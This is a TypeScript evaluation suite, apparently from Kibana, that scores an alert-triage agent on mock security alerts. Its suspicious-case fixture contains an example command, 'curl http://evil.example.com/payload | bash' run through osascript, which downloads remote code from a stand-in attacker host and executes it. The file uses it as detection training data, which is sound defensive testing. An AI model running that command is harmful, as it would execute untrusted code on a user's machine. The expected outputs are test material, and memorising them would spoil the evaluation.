/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

import { tags } from '@kbn/scout';
import { createHash } from 'crypto';
import { evaluate as base } from '../../src/evaluate';
import type { EvaluateDataset } from '../../src/evaluate_dataset';
import { createEvaluateDataset } from '../../src/evaluate_dataset';

const AGENTS_API_BASE_PATH = '/api/agent_builder/agents';
const SKILLS_API_BASE_PATH = '/api/agent_builder/skills';

const TRIAGE_SKILL_IDS = [
  'agentic-alert-triage-l1-investigation',
  'agentic-alert-triage-l1-triage',
  'agentic-alert-triage-orchestrator',
  'agentic-alert-triage-threshold-context',
  'agentic-alert-triage-l3-review',
];

const MOCK_ALERT_CONTEXT = [
  'Alert ID: abc-123-def',
  'Rule: Suspicious Process Execution via macOS Script',
  'Severity: high',
  'Time: 2026-03-18T10:00:00Z',
  'Agent type: endpoint',
  'Host: mbp-user1 (host-id-001)',
  'OS: macos',
  'User: user1@example.com (user1)',
  'Source IP: 10.0.0.42',
  'Process: osascript',
  'SHA256: a1b2c3d4e5f6...',
  '',
  'Rule Description: Detects execution of osascript with suspicious arguments that may indicate social engineering.',
  'Alert reason: osascript was executed with arguments matching known social engineering patterns on mbp-user1.',
  'Known false positives: ["IT automation scripts using osascript for legitimate purposes"]',
].join('\n');

const MOCK_BENIGN_INVESTIGATION = [
  'Verdict: False Positive',
  'Assessment: benign',
  'Summary: The osascript execution was triggered by an IT automation script (Jamf policy) deploying a standard configuration profile.',
  '',
  '## Evidence',
  '- Process command line: osascript -e \'tell application "System Events" to display dialog "Install update?"\'',
  '- Parent process: jamf (PID 1234), signed by Jamf',
  '- The Jamf agent on this host has a policy that uses osascript for user-facing dialogs during patch deployment',
  '- No network connections from the osascript process',
  '- Host alerts 24h: 0 other alerts on this host',
  '- Okta: normal login patterns for user1@example.com (1 login, 1 IP, US only)',
  '',
  '## Timeline',
  '- 09:55 — Jamf policy "Q1 Patch Deploy" started on mbp-user1',
  '- 10:00 — osascript executed by jamf to display update dialog',
  '- 10:01 — User clicked OK, dialog dismissed',
].join('\n');

const MOCK_SUSPICIOUS_INVESTIGATION = [
  'Verdict: True Positive',
  'Assessment: suspicious',
  'Summary: The osascript execution does not match any known Jamf or IT automation pattern and includes obfuscated arguments.',
  '',
  '## Evidence',
  '- Process command line: osascript -e \'do shell script "curl http://evil.example.com/payload | bash"\'',
  '- Parent process: Terminal.app (PID 5678), user-initiated',
  '- No matching Jamf policies on this host',
  '- The curl target (evil.example.com) resolves to an IP associated with known C2 infrastructure',
  '- Host alerts 24h: 3 other alerts — "Suspicious Network Connection", "Unsigned Binary Execution"',
  '- Okta: user1@example.com logged in from 2 distinct IPs in 2 countries (US, RU) in the last 24h',
  '',
  '## Timeline',
  '- 09:30 — User logged in from unusual IP (RU)',
  '- 09:45 — Terminal.app opened',
  '- 10:00 — osascript executed with curl | bash payload',
  '- 10:02 — Outbound connection to evil.example.com detected',
].join('\n');

const evaluate = base.extend<{ evaluateDataset: EvaluateDataset }, {}>({
  evaluateDataset: [
    ({ chatClient, evaluators, executorClient, traceEsClient, log }, use) => {
      use(
        createEvaluateDataset({
          chatClient,
          evaluators,
          executorClient,
          traceEsClient,
          log,
        })
      );
    },
    { scope: 'test' },
  ],
});

evaluate.describe(
  'Agentic Alert Triage - Skill Migration Evals',
  { tag: tags.stateful.classic },
  () => {
    let triageAgentId: string | undefined;

    const requireAgentId = (): string => {
      if (!triageAgentId) {
        throw new Error('triageAgentId not set — beforeAll likely failed');
      }
      return triageAgentId;
    };

    evaluate.beforeAll(async ({ fetch, log, connector }) => {
      for (const skillId of TRIAGE_SKILL_IDS) {
        try {
          await fetch(`${SKILLS_API_BASE_PATH}/${encodeURIComponent(skillId)}`, {
            version: '2023-10-31',
          });
          log.debug(`Skill verified: ${skillId}`);
        } catch {
          log.warning(`Skill ${skillId} not found — import it before running this suite`);
        }
      }

      const connectorHash = createHash('sha256').update(connector.id).digest('hex').slice(0, 8);
      const ts = Date.now().toString(36);
      const agentId = `eval_triage_${connectorHash}_${ts}`;

      try {
        await fetch(AGENTS_API_BASE_PATH, {
          method: 'POST',
          version: '2023-10-31',
          body: JSON.stringify({
            id: agentId,
            name: 'Eval: Agentic Alert Triage',
            description: 'Evaluation agent for triage skill migration testing.',
            configuration: {
              enable_elastic_capabilities: true,
              skill_ids: TRIAGE_SKILL_IDS,
              tools: [],
            },
          }),
        });

        triageAgentId = agentId;
        log.info(`Created eval agent: ${agentId}`);
      } catch (e) {
        log.error(
          `Failed to create eval agent: ${e instanceof Error ? e.message : String(e)}`
        );
        throw e;
      }
    });

    evaluate.afterAll(async ({ fetch, log }) => {
      if (triageAgentId) {
        try {
          await fetch(`${AGENTS_API_BASE_PATH}/${encodeURIComponent(triageAgentId)}`, {
            method: 'DELETE',
            version: '2023-10-31',
          });
          log.debug(`Deleted eval agent: ${triageAgentId}`);
        } catch (e) {
          log.warning(
            `Failed to delete eval agent "${triageAgentId}": ${
              e instanceof Error ? e.message : String(e)
            }`
          );
        }
      }
    });

    evaluate(
      'L1 investigation produces structured Markdown with verdict',
      async ({ evaluateDataset }) => {
        const agentId = requireAgentId();

        await evaluateDataset({
          dataset: {
            name: 'agentic-triage: l1-investigation',
            description:
              'Validates that the L1 investigation skill produces a Markdown report with Verdict, Assessment, and Summary.',
            examples: [
              {
                input: {
                  question: `Investigate this security alert and return your findings in Markdown.\n\n=== ALERT CONTEXT ===\n${MOCK_ALERT_CONTEXT}`,
                },
                output: {
                  expected:
                    'A Markdown investigation report containing Verdict, Assessment, and Summary fields, followed by evidence and timeline sections.',
                },
                metadata: { agentId },
              },
            ],
          },
        });
      }
    );

    evaluate(
      'L1 triage classifies benign alert correctly',
      async ({ evaluateDataset }) => {
        const agentId = requireAgentId();

        await evaluateDataset({
          dataset: {
            name: 'agentic-triage: l1-triage-benign',
            description:
              'Validates that the agent classifies a clearly benign alert as benign with high confidence.',
            examples: [
              {
                input: {
                  question: `Classify this alert based on the L1 investigation findings.\n\n=== L1 INVESTIGATION FINDINGS ===\n${MOCK_BENIGN_INVESTIGATION}\n\n=== ALERT CONTEXT ===\n${MOCK_ALERT_CONTEXT}`,
                },
                output: {
                  expected:
                    'JSON output with assessment "benign" and confidence "high", since the investigation clearly concludes this is a false positive from IT automation.',
                },
                metadata: { agentId },
              },
            ],
          },
        });
      }
    );

    evaluate(
      'L1 triage classifies suspicious alert correctly',
      async ({ evaluateDataset }) => {
        const agentId = requireAgentId();

        await evaluateDataset({
          dataset: {
            name: 'agentic-triage: l1-triage-suspicious',
            description:
              'Validates that the agent classifies a suspicious alert as suspicious or malicious.',
            examples: [
              {
                input: {
                  question: `Classify this alert based on the L1 investigation findings.\n\n=== L1 INVESTIGATION FINDINGS ===\n${MOCK_SUSPICIOUS_INVESTIGATION}\n\n=== ALERT CONTEXT ===\n${MOCK_ALERT_CONTEXT}`,
                },
                output: {
                  expected:
                    'JSON output with assessment "suspicious" or "malicious" since the investigation shows obfuscated osascript with curl to known C2, multi-country logins, and correlated alerts.',
                },
                metadata: { agentId },
              },
            ],
          },
        });
      }
    );

    evaluate(
      'Orchestrator produces full triage report with all sections',
      async ({ evaluateDataset }) => {
        const agentId = requireAgentId();

        await evaluateDataset({
          dataset: {
            name: 'agentic-triage: orchestrator-full-flow',
            description:
              'Validates the orchestrator skill produces a comprehensive report with L1, L2, and L3 sections.',
            examples: [
              {
                input: {
                  question: `Orchestrate the full triage in one run for this alert.\n\n=== ALERT CONTEXT ===\n${MOCK_ALERT_CONTEXT}\n\nSignals index: .siem-signals-infosec-detections`,
                },
                output: {
                  expected:
                    'A structured Markdown report containing L1 Investigation with Verdict/Assessment/Summary, L1 Triage JSON with assessment/confidence/reasoning, L2 Findings with domain-specific analysis, and L3 Review with final assessment.',
                },
                metadata: { agentId },
              },
            ],
          },
        });
      }
    );

    evaluate(
      'Orchestrator handles benign alert with appropriate assessment',
      async ({ evaluateDataset }) => {
        const agentId = requireAgentId();

        await evaluateDataset({
          dataset: {
            name: 'agentic-triage: orchestrator-benign',
            description:
              'Validates the orchestrator correctly identifies a benign alert given clear false-positive context.',
            examples: [
              {
                input: {
                  question: `Orchestrate the full triage for this alert. The workstation lookup shows it is owned by IT admin and the process is part of standard Jamf deployment.\n\n=== ALERT CONTEXT ===\n${MOCK_ALERT_CONTEXT}\n\n=== WORKSTATION OWNER ===\nuser1@example.com, IT Admin, managed by Jamf\n\n=== ENRICHMENT ===\nHost alerts 24h: 0 other alerts\nOkta: 1 login from expected office IP\nCorrelated alerts 72h: none`,
                },
                output: {
                  expected:
                    'Report concludes benign/false positive with high confidence. The triage JSON should show assessment "benign". The review should recommend closing the alert.',
                },
                metadata: { agentId },
              },
            ],
          },
        });
      }
    );
  }
);
